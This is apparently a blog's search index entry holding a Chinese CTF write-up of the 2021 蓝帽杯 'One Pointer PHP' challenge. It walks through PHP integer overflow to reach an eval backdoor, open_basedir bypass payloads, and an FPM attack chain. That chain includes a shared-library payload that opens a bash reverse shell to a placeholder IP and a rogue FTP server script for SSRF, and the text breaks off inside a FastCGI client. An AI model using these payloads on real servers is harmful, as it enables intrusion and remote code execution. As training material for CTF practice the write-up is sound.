<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021 蓝帽杯 One Pointer PHP</title>
    <url>/2022/08/31/2021_%E8%93%9D%E5%B8%BD%E6%9D%AFOne%20Pointer%20PHP/</url>
    <content><![CDATA[<h1 id="2021-蓝帽杯-One-Pointer-PHP"><a href="#2021-蓝帽杯-One-Pointer-PHP" class="headerlink" title="[2021 蓝帽杯] One Pointer PHP"></a>[2021 蓝帽杯] One Pointer PHP</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="1-php数组溢出"><a href="#1-php数组溢出" class="headerlink" title="1.php数组溢出"></a>1.php数组溢出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位系统 最大整数  =&gt; 231 =&gt; 2,147,483,648 - 1 =&gt; 2,147,483,647</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位系统 最大整数  =&gt; 263 =&gt; 9,223,372,036,854,775,808 - 1  =&gt; 9,223,372,036,854,775,807</span><br></pre></td></tr></table></figure>

<p>如果超出整型范围则解析为浮点型。 </p>
<span id="more"></span>
<h3 id="2-a-的赋值特性"><a href="#2-a-的赋值特性" class="headerlink" title="2.$a[]的赋值特性"></a>2.$a[]的赋值特性</h3><p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(1).png" alt="image.png"><br>如果我们赋值给<code>$a[100]=2</code>,则<code>$a[]=3;</code>默认为<code>$a[101]=3</code><br>即赋值给下一个索引值。</p>
<h4 id="示例1"><a href="#示例1" class="headerlink" title="#示例1"></a>#示例1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$count[]=100000000000000000000000;   // 只要大于9,223,372,036,854,775,807就能返回`yes`</span><br><span class="line">if($count[]=1)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 输出yes</span><br></pre></td></tr></table></figure>

<h3 id="3-Bypass-open-basedir"><a href="#3-Bypass-open-basedir" class="headerlink" title="3.Bypass open_basedir"></a>3.Bypass open_basedir</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>open_basedir是php.ini的一个配置选项，可以将用户的目录活动范围锁在范围之内。<br>如：活动范围是：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png" alt="image.png"><br>则<code>/var/www/html/test可访问</code><br>且<code>/var/www不可访问</code><br>即 限制范围的衍生出来的目录可以访问，以内不能访问</p>
<h4 id="方法一：命令执行函数绕过"><a href="#方法一：命令执行函数绕过" class="headerlink" title="方法一：命令执行函数绕过"></a>方法一：命令执行函数绕过</h4><p>新建3.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=../index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(3).png" alt="image.png"><br>成功读取文件</p>
<p>设置了open_basedir后：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(4).png" alt="image.png"><br>禁止读取文件了，如果用system函数读取呢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include(&quot;php://filter/read=convert.base64-encode/resource=../index.php&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;type ..\index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(5).png" alt="image.png"></p>
<h4 id="方法二-glob协议"><a href="#方法二-glob协议" class="headerlink" title="方法二.glob协议"></a>方法二.glob协议</h4><p>用这个代码，访问该文件就可以得到根目录的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//将根目录的文件名字输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(6).png" alt="image.png"></p>
<h4 id="方法三-利用ini-set读取文件内容"><a href="#方法三-利用ini-set读取文件内容" class="headerlink" title="方法三.利用ini_set读取文件内容"></a>方法三.利用ini_set读取文件内容</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;TES&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;TES&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);  <span class="comment">//一定要有这个var_dump，否则是没有回显的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功访问</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(7).png" alt="image.png">解题</h2><p>题目给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="溢出绕过"><a href="#溢出绕过" class="headerlink" title="溢出绕过"></a>溢出绕过</h3><p>这里要求<code>$count[]=1为假</code><br>即<code>$count[++$user-&gt;count]</code>中的<code>++$user-&gt;count</code>&#x3D;9,223,372,036,854,775,807</p>
<p>这样子就可以使得$count[]&#x3D;1的序列号为<code>9,223,372,036,854,775,808</code>，溢出了整数最大值，便可以为假<br>成功执行eval一句话木马，试一下phpinfo()<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(8).png" alt="image.png"><br>可以看到phpinfo()；成功执行了<br>注意到phpinfo里面有disable_function<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(9).png" alt="image.png"><br>还有限制目录<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png" alt="image.png"><br>这里有几个方法 可以绕过，我就说两三个：</p>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><h4 id="1-ini-set-的方法"><a href="#1-ini-set-的方法" class="headerlink" title="1.ini_set 的方法"></a>1.ini_set 的方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>这段话的简单过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -&gt; 创建新的目录</span><br><span class="line">chdir -&gt; 进入目录</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;) -&gt; 设置..为可用的路径</span><br><span class="line">chdir(..） -&gt; 上一级</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;) -&gt; 设置/为可用的路径</span><br><span class="line">scandir  -&gt;  列出指定目录的文件，返回的是array</span><br><span class="line">print_r()  -&gt; 打印</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(10).png" alt="image.png"></p>
<h4 id="2-连接蚁剑，上传文件"><a href="#2-连接蚁剑，上传文件" class="headerlink" title="2.连接蚁剑，上传文件"></a>2.连接蚁剑，上传文件</h4><p>连接的地址是<code>/add_api.php?backdoor=eval($_POST[8]);</code><br>记得添加请求信息的Cookie，值为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code><br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(11).png" alt="image.png"><br>连接成功<br>上传文件a.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//将根目录的文件名字输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上传成功后，访问即可以得到根目录：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(12).png" alt="image.png"></p>
<h4 id="3-利用DirectoryIterator的globa"><a href="#3-利用DirectoryIterator的globa" class="headerlink" title="3.利用DirectoryIterator的globa"></a>3.利用DirectoryIterator的globa</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>直接复制贴在backdoor后面:<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(13).png" alt="image.png"></p>
<hr>
<p>开始下一步解题</p>
<h3 id="分析配置文件"><a href="#分析配置文件" class="headerlink" title="分析配置文件"></a>分析配置文件</h3><p>尝试读取flag：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">mkdir</span>(%<span class="number">27</span>qf%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>qf%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(%<span class="number">27</span>/%<span class="number">27</span>));<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(%<span class="number">27</span>/flag%<span class="number">27</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(14).png" alt="image.png"><br>返回了False</p>
<p>看一下本地进程<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(15).png" alt="image.png"></p>
<p>再看一下fpm的运行端口：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/nginx/sites-available/default&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>返回 ：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(16).png" alt="image.png"><br>发现在9001端口<br><code>fastcgi_pass 127.0.0.1:9001;</code>只接受本地的包，如果要利用FastCgi需要利用SSRF</p>
<h3 id="FPM未授权攻击"><a href="#FPM未授权攻击" class="headerlink" title="FPM未授权攻击"></a>FPM未授权攻击</h3><h4 id="1-构造恶意的so文件"><a href="#1-构造恶意的so文件" class="headerlink" title="1.构造恶意的so文件"></a>1.构造恶意的so文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#x27;&quot;</span>);  <span class="comment">//记住这个监听端口，要与下面的保持一致</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc payload.c -fPIC -shared -o payload.so</span></span><br></pre></td></tr></table></figure>
<p>这个payload.so的名字也要和<code>php脚本</code>对应</p>
<h4 id="2-构造SSRF"><a href="#2-构造SSRF" class="headerlink" title="2.构造SSRF"></a>2.构造SSRF</h4><p>构造一个文件，file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$file</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>$file = $_GET[&#39;file&#39;] ?? &#39;/tmp/file&#39;;</code><br>??是php7以上的新语法，如果 $_GET[‘file’] 存在，则取 $_GET[‘file’] 的值，若不存在，则取 &#x2F;tmp&#x2F;file<br><code>类似 isset($a)? $a:$b;</code></p>
<h4 id="3-构造FTP服务器"><a href="#3-构造FTP服务器" class="headerlink" title="3.构造FTP服务器"></a>3.构造FTP服务器</h4><p>都说了是FTP服务器，肯定是得能访问，所以这个要在公网上运行这个脚本（python）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.<span class="title function_ invoke__">bind</span>((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>))<span class="comment">#这里是ftp的端口</span></span><br><span class="line">s.<span class="title function_ invoke__">listen</span>(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.<span class="title function_ invoke__">accept</span>()</span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)  </span></span><br><span class="line">                                                            <span class="comment">// 注意端口</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.<span class="title function_ invoke__">close</span>()</span><br></pre></td></tr></table></figure>
<p>注意：只要连接到就会退出</p>
<h4 id="4-构造Fastcgi请求"><a href="#4-构造Fastcgi请求" class="headerlink" title="4.构造Fastcgi请求"></a>4.构造Fastcgi请求</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VERSION_1</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">BEGIN_REQUEST</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ABORT_REQUEST</span>        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">END_REQUEST</span>          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PARAMS</span>               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDIN</span>                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDOUT</span>               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDERR</span>               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATA</span>                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES</span>           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES_RESULT</span>    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_TYPE</span>         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAXTYPE</span>              = <span class="built_in">self</span>::<span class="variable constant_">UNKNOWN_TYPE</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RESPONDER</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AUTHORIZER</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FILTER</span>               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">REQUEST_COMPLETE</span>     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CANT_MPX_CONN</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OVERLOADED</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_ROLE</span>         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_CONNS</span>            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_REQS</span>             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MPXS_CONNS</span>           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HEADER_LEN</span>           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable 